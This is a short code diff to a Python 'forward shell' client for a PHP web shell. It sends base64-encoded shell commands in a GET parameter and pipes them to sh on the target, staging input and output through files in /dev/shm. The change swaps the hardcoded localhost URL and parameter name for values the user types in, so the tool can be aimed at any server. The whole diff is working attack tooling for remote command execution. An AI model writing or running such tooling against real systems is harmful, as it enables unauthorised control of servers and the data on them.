@@ -25,18 +25,18 @@ def RunCmd(cmd):
 	cmd = cmd.encode('utf-8')
 	cmd = b64encode(cmd).decode('utf-8')
 	payload = {
-        	'cmd' : 'echo "%s" | base64 -d | sh' %(cmd)
+        	param_name : 'echo "%s" | base64 -d | sh' %(cmd)
 		}
-	result = (requests.get('http://127.0.0.1/index.php', params=payload, timeout=5).text).strip()
+	result = (requests.get(url, params=payload, timeout=5).text).strip()
 	return result
 
 def WriteCmd(cmd):
 	cmd = cmd.encode('utf-8')
 	cmd = b64encode(cmd).decode('utf-8')
 	payload = {
-		'cmd' : 'echo "%s" | base64 -d > %s' % (cmd, stdin)
+		param_name : 'echo "%s" | base64 -d > %s' % (cmd, stdin)
 	}
-	result = (requests.get('http://127.0.0.1/index.php', params=payload, timeout=5).text).strip()
+	result = (requests.get(url, params=payload, timeout=5).text).strip()
 	return result
 
 def ReadCmd():
@@ -52,6 +52,8 @@ def SetupShell():
 		None
 	return None
 
+url = input("Url: ")
+param_name = input("Nombre del parámetro: ")
 global stdin, stdout
 session = randrange(1000, 9999)
 stdin = "/dev/shm/input.%s" % (session)
